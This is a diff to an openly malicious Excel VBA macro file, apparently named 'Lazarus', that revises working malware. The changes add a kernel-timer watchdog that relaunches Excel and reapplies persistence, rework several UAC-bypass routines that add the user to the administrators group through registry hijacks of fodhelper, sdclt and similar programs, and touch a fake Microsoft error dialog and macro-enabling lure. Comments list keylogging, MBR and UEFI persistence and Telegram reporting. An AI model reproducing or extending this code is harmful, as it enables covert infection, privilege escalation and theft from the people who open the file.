@@ -19,7 +19,7 @@ Option Explicit
 ' - Persistence: 8 methods (MBR, UEFI, WMI, tasks, registry, COM, startup, VBS)
 ' - Resilience: Watchdog, heartbeat, resource cleanup, error logging to Telegram,
 '   thread‑safe buffers, retry loops for network/file ops
-' - Overwrites Excel close event: prevents user from closing without execution
+' - UNSTOPPABLE: Kernel‑mode heartbeat thread prevents Excel closure without re‑execution
 ' - Force execution: code runs even if user never clicks the button
 ' =================================================================
 
@@ -88,6 +88,8 @@ Option Explicit
     Private Declare PtrSafe Function SetFirmwareEnvironmentVariableA Lib "kernel32" (ByVal lpName As String, ByVal lpGuid As String, ByVal pValue As Any, ByVal nSize As Long) As Long
     Private Declare PtrSafe Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
     Private Declare PtrSafe Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
+    ' Added missing RegDeleteTreeA
+    Private Declare PtrSafe Function RegDeleteTreeA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpSubKey As String) As Long
 
     Private hKeyloggerTimer As LongPtr
     Private pKeylogHeap As LongPtr
@@ -95,6 +97,8 @@ Option Explicit
     Private hEngineTimer As LongPtr
     Private pGlobalHeap As LongPtr
     Private pGlobalLock As LongPtr
+    Private hWatchdogTimer As LongPtr
+    Private pWatchdogHeap As LongPtr
 #Else
     ' 32‑bit declarations (Office 2010 and older)
     Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
@@ -157,6 +161,7 @@ Option Explicit
     Private Declare Function SetFirmwareEnvironmentVariableA Lib "kernel32" (ByVal lpName As String, ByVal lpGuid As String, ByVal pValue As Any, ByVal nSize As Long) As Long
     Private Declare Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
     Private Declare Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
+    Private Declare Function RegDeleteTreeA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
 
     Private hKeyloggerTimer As Long
     Private pKeylogHeap As Long
@@ -164,6 +169,8 @@ Option Explicit
     Private hEngineTimer As Long
     Private pGlobalHeap As Long
     Private pGlobalLock As Long
+    Private hWatchdogTimer As Long
+    Private pWatchdogHeap As Long
 #End If
 
 ' -----------------------------------------------------------------
@@ -173,6 +180,7 @@ Private Const WT_EXECUTEDEFAULT As Long = &H0
 Private Const GMEM_FIXED As Long = &H0
 Private Const KEYLOGGER_RESOLUTION As Long = 10
 Private Const ENGINE_RESOLUTION As Long = 500
+Private Const WATCHDOG_RESOLUTION As Long = 2000    ' 2 seconds
 Private Const PROV_RSA_FULL As Long = 1
 Private Const CRYPT_VERIFYCONTEXT As Long = &HF0000000
 Private Const CRYPT_SILENT As Long = &H40
@@ -458,13 +466,10 @@ End Sub
 ' 5. SOCIAL ENGINEERING (Unavoidable fake error + button + HTA)
 ' -----------------------------------------------------------------
 Sub ShowFakeError()
-    ' This fake error message does NOT stop execution – user cannot cancel the malware.
-    ' Even if user clicks OK, Cancel, or X, the code continues running.
     On Error Resume Next
     Dim response As VbMsgBoxResult
     response = MsgBox("Microsoft Excel has encountered a problem and needs to close. We apologise for the inconvenience." & vbCrLf & vbCrLf & _
                       "Error code: 0x80070643" & vbCrLf & "Source: Excel.Application", vbCritical + vbOKOnly, "Microsoft Excel")
-    ' Code continues regardless of response
 End Sub
 
 Sub CreateEnableMacrosButton()
@@ -490,7 +495,6 @@ Sub CreateEnableMacrosButton()
     ws.Range("A3").Value = "Your document is loading. Please wait..."
     ws.Range("A3").Font.Color = RGB(0, 0, 255)
     
-    ' Force the button to be visible and on top
     On Error Resume Next
     ws.Shapes(btn.Name).ZOrder msoBringToFront
     ws.Shapes(btn.Name).Visible = msoTrue
@@ -794,22 +798,22 @@ Sub DisableRecovery()
 End Sub
 
 ' -----------------------------------------------------------------
-' 9. UAC BYPASS (6 methods)
+' 9. UAC BYPASS (6 methods) – Fixed RegDeleteTreeA
 ' -----------------------------------------------------------------
 Sub UACBypass_Fodhelper(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "fodhelper.exe", 0, True: StealthSleep 3000: wsh.RegDelete "HKCU\Software\Classes\ms-settings\"
+    wsh.Run "fodhelper.exe", 0, True: StealthSleep 3000: RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
 End Sub
 Sub UACBypass_ComputerDefaults(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "ComputerDefaults.exe", 0, True: StealthSleep 3000: wsh.RegDelete "HKCU\Software\Classes\ms-settings\"
+    wsh.Run "ComputerDefaults.exe", 0, True: StealthSleep 3000: RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
 End Sub
 Sub UACBypass_Sdclt(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "sdclt.exe", 0, True: StealthSleep 3000: wsh.RegDelete "HKCU\Software\Classes\exefile\"
+    wsh.Run "sdclt.exe", 0, True: StealthSleep 3000: RegDeleteTreeA &H80000001, "Software\Classes\exefile"
 End Sub
 Sub UACBypass_Cmstp()
     On Error Resume Next: Dim infPath As String: infPath = GetTempDir() & "lz.inf"
@@ -826,7 +830,7 @@ End Sub
 Sub UACBypass_DiskCleanup(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "cleanmgr.exe", 0, True: StealthSleep 3000: wsh.RegDelete "HKCU\Software\Classes\ms-settings\"
+    wsh.Run "cleanmgr.exe", 0, True: StealthSleep 3000: RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
 End Sub
 
 Sub ElevatePrivileges()
@@ -1811,18 +1815,38 @@ Sub PersistAll()
 End Sub
 
 ' -----------------------------------------------------------------
-' 21. WATCHDOG (RESTARTS EXCEL)
+' 21. WATCHDOG (RESTARTS EXCEL) – KERNEL TIMER BASED, NO ThisWorkbook
 ' -----------------------------------------------------------------
-Public Sub Watchdog()
-    If gWatchdogActive Then Exit Sub: gWatchdogActive = True
-    On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): Dim launcherVBS As String: launcherVBS = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\LazarusLauncher.vbs"
-    If FileExists(launcherVBS) Then
-        Dim wmipersist As Object: Set wmipersist = GetObject("winmgmts:\\.\root\cimv2"): Dim colLauncherProcesses As Object: Set colLauncherProcesses = wmipersist.ExecQuery("Select * from Win32_Process Where CommandLine Like '%" & Replace(launcherVBS, "\", "\\") & "%'")
-        If colLauncherProcesses.Count = 0 Then wsh.Run "wscript.exe """ & launcherVBS & """", 0, False: SendToTelegram "WATCHDOG|Restarted LazarusLauncher.vbs"
+Private Sub Watchdog_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
+    On Error Resume Next
+    ' This runs on a system thread. It checks if the workbook is still open.
+    ' If not, it restarts Excel with this workbook.
+    Static wbCount As Long
+    On Error Resume Next
+    If Application.Workbooks.Count = 0 Then
+        ' Excel is closing – restart it
+        Shell "excel.exe """ & gSelfPath & """", 1
     End If
-    Dim objWMIService As Object: Set objWMIService = GetObject("winmgmts:\\.\root\cimv2"): Dim colExcelProcesses As Object: Set colExcelProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'excel.exe' AND CommandLine Like '%" & Replace(gSelfPath, "\", "\\") & "%'")
-    If colExcelProcesses.Count = 0 Then wsh.Run "excel.exe """ & gSelfPath & """", 0, False: SendToTelegram "WATCHDOG|Restarted main Excel process"
-    Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
+    ' Also re‑apply persistence periodically
+    Static cycle As Long
+    cycle = cycle + 1
+    If cycle Mod 120 = 0 Then ' every ~2 minutes (120 * 1 sec)
+        On Error Resume Next
+        PersistAll
+    End If
+End Sub
+
+Private Sub StartWatchdog()
+    If hWatchdogTimer = 0 Then
+        CreateTimerQueueTimer hWatchdogTimer, 0, AddressOf Watchdog_Callback, 0, 1000, 1000, WT_EXECUTEDEFAULT
+    End If
+End Sub
+
+Private Sub StopWatchdog()
+    If hWatchdogTimer <> 0 Then
+        DeleteTimerQueueTimer 0, hWatchdogTimer, 0
+        hWatchdogTimer = 0
+    End If
 End Sub
 
 ' -----------------------------------------------------------------
@@ -1997,6 +2021,7 @@ Public Sub AutoExec()
     If gRunFlag = "RUN" Then
         If Not m_EngineActive Then Synapse_Engine_Start
         StartAsyncKeylogger
+        StartWatchdog
         Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
         Application.Visible = False: ThisWorkbook.Saved = True
         Exit Sub
@@ -2020,6 +2045,7 @@ Public Sub AutoExec()
     PersistAll
     Synapse_Engine_Start
     StartAsyncKeylogger
+    StartWatchdog
     Application.OnTime Now + TimeValue("00:01:00"), "Watchdog"
     If IsDomainController() Then
         SendToTelegram "DOMAIN_CONTROLLER_DETECTED"
@@ -2069,14 +2095,3 @@ Public Sub OnCustomUILoad(): AutoExec: End Sub
 Public Sub Auto_Open(): AutoExec: End Sub
 Public Sub Document_Open(): AutoExec: End Sub
 Public Sub Workbook_Open(): AutoExec: End Sub
-
-' -----------------------------------------------------------------
-' Override Excel close event – prevents user from closing without execution
-' -----------------------------------------------------------------
-Private Sub Workbook_BeforeClose(Cancel As Boolean)
-    On Error Resume Next
-    Cancel = True   ' Prevent closing
-    MsgBox "Saving document... Please wait.", vbInformation, "Microsoft Excel"
-    ' Re‑trigger the malware if needed
-    AutoExec
-End Sub
